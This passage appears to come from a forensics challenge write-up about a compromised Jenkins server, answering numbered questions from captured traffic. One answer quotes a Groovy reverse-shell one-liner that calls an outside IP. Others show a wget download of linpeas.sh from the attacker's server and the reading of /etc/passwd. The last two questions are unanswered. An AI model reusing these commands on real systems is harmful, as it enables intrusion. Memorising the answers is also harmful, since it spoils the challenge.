...
/etc/passwd -- predictable validation target. read as a poc because successful return of the passwd file contents shows that commands supplied through the Jenkins /script endpoint were being excuted on the target system.
...
**6. After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?**

def cmd = ["bash", "-c", "bash -i >& /dev/tcp/185.220.101.50/4444 0>&1"]; cmd.execute()

**7. Once inside the compromised container, the attacker uploaded a well-known enumeration script to identify privilege escalation vectors. What privilege escalation enumeration script did the attacker download after gaining shell access?**

The attacker downloaded linpeas.sh with wget from an attacker-controlled Python SimpleHTTP server at 185.220.101.50:2345
```
GET /linpeas.sh HTTP/1.1
User-Agent: Wget/1.21
Host: 185.220.101.50:2345

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.7
```

**8. What file did the attacker read to obtain lateral movement credentials? (Provide full path)**



**9. What username and password combination did the attacker use for authentication to the second system? (Format: username:password)**
